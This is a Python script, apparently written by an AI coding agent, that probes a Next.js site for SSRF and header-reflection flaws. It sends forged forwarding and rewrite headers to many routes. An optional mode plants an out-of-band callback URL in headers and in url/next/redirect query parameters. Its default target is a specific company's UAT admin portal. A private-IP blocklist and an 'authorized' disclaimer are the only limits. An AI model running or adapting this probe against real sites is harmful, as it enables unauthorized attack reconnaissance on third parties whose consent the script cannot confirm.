#!/usr/bin/env python3
"""
Next.js SSRF/header reflection tester for authorized environments.

Default mode is safe:
- no internal/private/metadata targets,
- no POST/PUT/DELETE,
- only checks whether attacker-controlled host/url values are reflected into
  response headers, Location, or body.

Optional callback mode:
- requires --enable-callback and --callback-url,
- injects only your controlled OAST/callback URL into headers/query parameters,
- you must check the callback service logs manually.
"""

from __future__ import annotations

import argparse
import hashlib
import json
import re
import ssl
import time
import urllib.error
import urllib.parse
import urllib.request


DEFAULT_ROUTES = [
    "/",
    "/snap",
    "/pwt",
    "/data-platform",
    "/en/data-platform",
    "/fr/data-platform",
    "/data-platform/sigma-api",
    "/en/data-platform/sigma-api",
    "/fr/data-platform/sigma-api",
    "/onboarding",
    "/en/onboarding",
    "/fr/onboarding",
    "/offers",
    "/en/offers",
    "/fr/offers",
    "/issuance",
    "/en/issuance",
    "/fr/issuance",
]


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


def make_opener(insecure: bool):
    ctx = ssl.create_default_context()
    if insecure:
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
    return urllib.request.build_opener(urllib.request.HTTPSHandler(context=ctx), NoRedirect)


def join_url(base: str, path: str) -> str:
    return base.rstrip("/") + (path if path.startswith("/") else "/" + path)


def collapse(text: str, limit: int = 260) -> str:
    return re.sub(r"\s+", " ", text[:limit]).strip()


def safe_callback_url(value: str) -> str:
    if not value:
        return ""
    parsed = urllib.parse.urlparse(value)
    if parsed.scheme not in ("http", "https") or not parsed.netloc:
        raise SystemExit("--callback-url must be an absolute http(s) URL")
    host = parsed.hostname or ""
    blocked = [
        "localhost",
        "127.",
        "0.",
        "10.",
        "169.254.",
        "172.16.",
        "172.17.",
        "172.18.",
        "172.19.",
        "172.20.",
        "172.21.",
        "172.22.",
        "172.23.",
        "172.24.",
        "172.25.",
        "172.26.",
        "172.27.",
        "172.28.",
        "172.29.",
        "172.30.",
        "172.31.",
        "192.168.",
        "::1",
    ]
    if any(host.startswith(prefix) for prefix in blocked):
        raise SystemExit("Refusing localhost/private/metadata callback target")
    return value


def fetch(opener, base: str, path: str, headers: dict[str, str], timeout: int, cookie: str = ""):
    req_headers = {
        "User-Agent": "authorized-nextjs-ssrf-tester/1.0",
        "Accept": "text/html,application/json,*/*",
    }
    req_headers.update(headers)
    if cookie:
        req_headers["Cookie"] = cookie
    req = urllib.request.Request(join_url(base, path), headers=req_headers, method="GET")
    row = {
        "path": path,
        "status": None,
        "location": None,
        "headers": {},
        "body_len": 0,
        "body_sha256_prefix": None,
        "body_preview": "",
        "error": None,
    }
    try:
        with opener.open(req, timeout=timeout) as resp:
            raw = resp.read(160_000)
            update(row, resp, raw)
    except urllib.error.HTTPError as exc:
        raw = exc.read(160_000)
        update(row, exc, raw)
    except Exception as exc:
        row["error"] = f"{type(exc).__name__}: {exc}"
    return row


def update(row, resp, raw: bytes):
    text = raw.decode("utf-8", errors="replace")
    row["status"] = resp.getcode()
    row["location"] = resp.headers.get("Location")
    row["headers"] = {k.lower(): v for k, v in resp.headers.items()}
    row["body_len"] = len(raw)
    row["body_sha256_prefix"] = hashlib.sha256(raw).hexdigest()[:16]
    row["body_preview"] = collapse(text)


def build_header_sets(canary_host: str, callback_url: str, marker: str):
    callback_host = urllib.parse.urlparse(callback_url).netloc if callback_url else canary_host
    header_sets = [
        {
            "name": "forwarded_host",
            "headers": {
                "X-Forwarded-Host": canary_host,
                "X-Forwarded-Proto": "https",
                "X-Codex-SSRF-Marker": marker,
            },
            "needles": [canary_host, marker],
        },
        {
            "name": "forwarded_header",
            "headers": {
                "Forwarded": f"host={canary_host};proto=https",
                "X-Codex-SSRF-Marker": marker,
            },
            "needles": [canary_host, marker],
        },
        {
            "name": "rewrite_original_url",
            "headers": {
                "X-Original-URL": f"https://{canary_host}/original/{marker}",
                "X-Rewrite-URL": f"https://{canary_host}/rewrite/{marker}",
            },
            "needles": [canary_host, marker],
        },
        {
            "name": "middleware_like_headers",
            "headers": {
                "X-Middleware-Prefetch": "1",
                "Next-Router-Prefetch": "1",
                "X-Codex-SSRF-Marker": marker,
            },
            "needles": [marker],
        },
    ]
    if callback_url:
        header_sets.extend(
            [
                {
                    "name": "callback_url_in_forward_headers",
                    "headers": {
                        "X-Forwarded-Host": callback_host,
                        "X-Forwarded-Proto": urllib.parse.urlparse(callback_url).scheme,
                        "X-Original-URL": callback_url.rstrip("/") + f"/original/{marker}",
                        "X-Rewrite-URL": callback_url.rstrip("/") + f"/rewrite/{marker}",
                    },
                    "needles": [callback_host, marker],
                },
                {
                    "name": "callback_url_in_generic_headers",
                    "headers": {
                        "X-Callback-URL": callback_url.rstrip("/") + f"/generic/{marker}",
                        "X-WebHook-URL": callback_url.rstrip("/") + f"/webhook/{marker}",
                        "X-Codex-SSRF-Marker": marker,
                    },
                    "needles": [callback_host, marker],
                },
            ]
        )
    return header_sets


def add_callback_query(route: str, callback_url: str, marker: str):
    if not callback_url:
        return route
    separator = "&" if "?" in route else "?"
    return route + separator + urllib.parse.urlencode(
        {
            "url": callback_url.rstrip("/") + f"/query-url/{marker}",
            "next": callback_url.rstrip("/") + f"/query-next/{marker}",
            "redirect": callback_url.rstrip("/") + f"/query-redirect/{marker}",
        }
    )


def main():
    parser = argparse.ArgumentParser(description="Next.js SSRF/header reflection tester")
    parser.add_argument("--base", default="https://uat.adminportal.airmiles.ca")
    parser.add_argument("--route", action="append", default=[])
    parser.add_argument("--canary-host", default="codex-ssrf-canary-4513.invalid")
    parser.add_argument("--callback-url", default="")
    parser.add_argument("--enable-callback", action="store_true")
    parser.add_argument("--cookie", default="")
    parser.add_argument("--timeout", type=int, default=12)
    parser.add_argument("--delay", type=float, default=0.1)
    parser.add_argument("--out", default="work/nextjs_ssrf_tester_results.json")
    parser.add_argument("--insecure", action="store_true")
    args = parser.parse_args()

    callback_url = ""
    if args.callback_url:
        if not args.enable_callback:
            raise SystemExit("Use --enable-callback with --callback-url to confirm you control the OAST target")
        callback_url = safe_callback_url(args.callback_url)

    routes = []
    for route in DEFAULT_ROUTES + args.route:
        if route not in routes:
            routes.append(route)

    opener = make_opener(args.insecure)
    marker = "codexssrf" + str(int(time.time()))
    header_sets = build_header_sets(args.canary_host, callback_url, marker)
    results = []
    reflection_hits = []

    for route in routes:
        tested_route = add_callback_query(route, callback_url, marker)
        for header_set in header_sets:
            row = fetch(opener, args.base, tested_route, header_set["headers"], args.timeout, args.cookie)
            blob = json.dumps(row["headers"], sort_keys=True) + "\n" + (row["location"] or "") + "\n" + row["body_preview"]
            reflected = [needle for needle in header_set["needles"] if needle and needle in blob]
            item = {
                "route": route,
                "tested_path": tested_route,
                "header_set": header_set["name"],
                "request_headers": header_set["headers"],
                "response": row,
                "reflected_needles": reflected,
            }
            results.append(item)
            if reflected:
                reflection_hits.append(item)
            time.sleep(args.delay)

    output = {
        "target": args.base,
        "timestamp_utc": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "marker": marker,
        "callback_mode": bool(callback_url),
        "callback_url": callback_url,
        "routes_tested": routes,
        "reflection_hit_count": len(reflection_hits),
        "reflection_hits": reflection_hits,
        "results": results,
        "manual_oast_note": "If callback mode was used, check your OAST/collaborator logs for the marker.",
    }
    with open(args.out, "w", encoding="utf-8") as handle:
        json.dump(output, handle, indent=2)
    print(json.dumps({"out": args.out, "marker": marker, "reflection_hit_count": len(reflection_hits)}, indent=2))


if __name__ == "__main__":
    main()
